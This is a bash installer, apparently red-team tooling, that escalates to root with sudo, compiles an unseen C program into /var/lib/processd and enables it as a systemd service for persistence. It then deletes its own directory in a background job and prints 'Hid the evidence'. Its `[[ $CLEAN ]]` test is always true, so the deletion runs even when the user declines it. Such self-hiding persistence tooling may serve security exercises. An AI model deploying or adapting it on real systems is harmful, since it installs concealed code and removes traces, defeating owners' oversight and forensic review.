#!/bin/bash -x
if [ "$EUID" -ne 0 ]; then
    echo "Must run as root"
    echo "Attempting privilege escalation..."
    exec sudo "$0" "$@"
fi

CURRENT_DIRECTORY="$(dirname "$(realpath "${0}")")"

# Should the directory be deleted after install?
CLEAN=false
if [[ "$1" == "--clean" ]]; then
    CLEAN=true;
else
    echo "Do you wish to delete this program after?"
    select yn in "Yes" "No"; do
        case $yn in
            Yes ) CLEAN=true; break;;
            No ) break;;
        esac
    done
fi

if [[ $(id -u) != "0" ]]; then
    echo "Must run as root"
    exit 1
fi

# BOILERPLATE DONE


gcc "$CURRENT_DIRECTORY/processd.c" -o /var/lib/processd
chmod 500 /var/lib/processd

cp "$CURRENT_DIRECTORY/processd.service" /etc/systemd/system/processd.service

systemctl start processd
systemctl enable processd

echo "Installed..."
echo "You should delete this folder now"


# BACK TO BOILERPLATE

if [[ $CLEAN ]]; then
    make clean
    # Delete the directory after installed

    CURRENT_DIRECTORY="$(dirname "$(realpath "${0}")")"
    TMP_DIR="$CURRENT_DIRECTORY/rt_delete_this"
    mkdir "$TMP_DIR"
    2>/dev/null find "$CURRENT_DIRECTORY" -mindepth 1 -exec mv {} "$TMP_DIR" \;
    {
        sleep 0.1;
        rm -rf "$TMP_DIR"
        rmdir "$CURRENT_DIRECTORY"
        echo "Hid the evidence"
        kill -9 $$
    } & 
fi

echo "Done!"